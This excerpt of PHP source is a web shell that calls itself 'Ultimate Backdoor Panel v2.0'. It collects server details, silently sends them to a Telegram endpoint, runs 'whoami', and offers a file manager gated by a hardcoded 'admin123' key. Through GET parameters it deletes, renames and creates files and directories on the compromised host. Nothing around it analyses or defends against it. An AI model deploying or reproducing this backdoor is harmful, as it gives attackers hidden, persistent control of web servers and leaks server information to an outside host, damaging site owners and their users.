...
// Initialize $info array with all required keys
$info = [
...
// Make sure Document Root has a value
if (empty($info['Document Root'])) {
    $info['Document Root'] = getcwd();
}
...
try {
    ...
    file_get_contents($telegram_url . '?' . http_build_query($params), false, $context);
} catch (Exception $e) {
    // Silent error - don't reveal failure
}

// === ADVANCED FILE MANAGER OPERATIONS ===
if(isset($_GET['action'])) {
    $action = $_GET['action'];
    $dir = isset($_GET['dir']) ? sanitizePath($_GET['dir']) : '.';
    ...
    if($action == 'delete_dir' && isset($_GET['dir_path'])) {
        $dir_path = sanitizePath($_GET['dir_path']);
        ...
        echo "<br><a href='?access=admin123&dir=" . urlencode($parent_dir) . "'>Back</a>";
        exit;
    }
    
    // Handle rename
    if($action == 'rename' && isset($_GET['old']) && isset($_GET['new'])) {
        $old = sanitizePath($_GET['old']);
        $new = sanitizePath($_GET['new']);
        if(rename($old, $new)) {
    ...
    if($action == 'create_file' && isset($_GET['filename'])) {
        $filename = sanitizePath($_GET['filename']);
        ...
        if (empty($file_dir)) $file_dir = '.';
        echo "<br><a href='?access=admin123&dir=" . urlencode($file_dir) . "'>Back</a>";
        exit;
    }
    
    // Handle create directory
    if($action == 'create_dir' && isset($_GET['dirname'])) {
        $dirname = sanitizePath($_GET['dirname']);
...
if(isset($_GET['demo'])) {
    ...
    foreach($common_apps as $path => $name) {
        $full_path = $info['Document Root'] . $path;
...
// Get current directory for file manager
...
<body>
    <div class="container">
        ...
        <div class="dashboard">
            <div class="card">
                ...
                <div class="status-box">
                    <strong>Server:</strong> <?php echo htmlspecialchars($info['Server']); ?><br>
                    <strong>IP:</strong> <?php echo htmlspecialchars($info['Server IP']); ?><br>
                    <strong>PHP:</strong> <?php echo htmlspecialchars($info['PHP Version']); ?><br>
                    <strong>User:</strong> <?php 
                        $user = @exec('whoami');
                        echo htmlspecialchars($user ?: 'Unknown');
                    ?>
                </div>
            </div>
        ...
        <div style="text-align: center; margin-top: 30px; padding-top: 20px; border-top: 1px solid rgba(255,255,255,0.1);">
            <small>Ultimate Backdoor Panel v2.0 | Active: <?php echo htmlspecialchars($info['Time']); ?> | Visitor IP: <?php echo htmlspecialchars($info['Visitor IP']); ?></small>
        </div>
    </div>
